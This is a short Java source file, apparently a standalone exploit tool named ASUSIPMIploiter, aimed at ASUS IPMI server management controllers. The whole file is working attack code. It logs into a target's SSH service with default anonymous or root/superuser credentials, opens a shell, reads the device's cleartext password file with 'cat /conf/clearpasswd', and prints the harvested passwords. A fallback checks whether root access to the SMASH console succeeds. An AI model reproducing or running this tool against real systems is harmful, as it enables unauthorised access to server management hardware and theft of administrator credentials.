/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package asusipmiploiter;

import ch.ethz.ssh2.Connection;
import ch.ethz.ssh2.Session;
import ch.ethz.ssh2.StreamGobbler;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;

/**
 *
 * @author pedrodias petermdias@gmail.com
 */
public class ASUSIPMIploiter {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        System.out.println("ASUSIPMIploiter v0.1");
        System.out.println("Pedro Dias - petermdias@gmail.com");

        if (args.length < 1) {
            System.out.println("usage: java -jar ASUSIPMIploiter.jar 192.168.20.1");
            System.exit(0);
        }

        if (getPasswords(args[0])) {
            System.out.println("----");
            System.out.println("Passwords grabbed.");
        } else {
            if (verifySMASH(args[0])) {
                System.out.println("Couldnt grab user's passwords, but SMASH console was acquired.");
            }
        }

    }

    public static boolean verifySMASH(String address) {
        try {
            SocketAddress sockaddr = new InetSocketAddress(address, 22);
            Socket socket = new Socket();
            socket.connect(sockaddr, 5000);
            Connection conn = new Connection(address, 22);
            conn.connect();
            InteractiveLogic il = new InteractiveLogic("superuser");

            boolean authed = conn.authenticateWithKeyboardInteractive("root", il);
            return authed;
        } catch (IOException ex) {
            return false;
        }
    }

    public static boolean getPasswords(String address) {
        try {
            SocketAddress sockaddr = new InetSocketAddress(address, 22);
            Socket socket = new Socket();
            socket.connect(sockaddr, 5000);
            Connection conn = new Connection(address, 22);
            conn.connect();
            InteractiveLogic il = new InteractiveLogic("anonymous");

            boolean isAuthenticated = conn.authenticateWithKeyboardInteractive("anonymous", il);

            if (isAuthenticated == false) {
                return false;
            } else {
                Session sess = conn.openSession();
                sess.startShell();

                InputStream stdout = new StreamGobbler(sess.getStdout());
                BufferedReader input = new BufferedReader(new InputStreamReader(stdout));
                OutputStream out = sess.getStdin();

                out.write("echo ping\n".getBytes());
                out.flush();

                while (!input.readLine().contains("ping")) {
                }

                out.write("cat /conf/clearpasswd; echo \"#endf\"\n".getBytes());

                String line = "";
                System.out.println("Passwords:");
                System.out.println("----");
                while (!(line = input.readLine()).contains("#endf")) {
                    if (!line.contains("root:") && !line.contains("anonymous:")) {
                        System.out.println(line);
                    }
                }
                return true;
            }
        } catch (IOException ex) {
            return false;
        }
    }
}
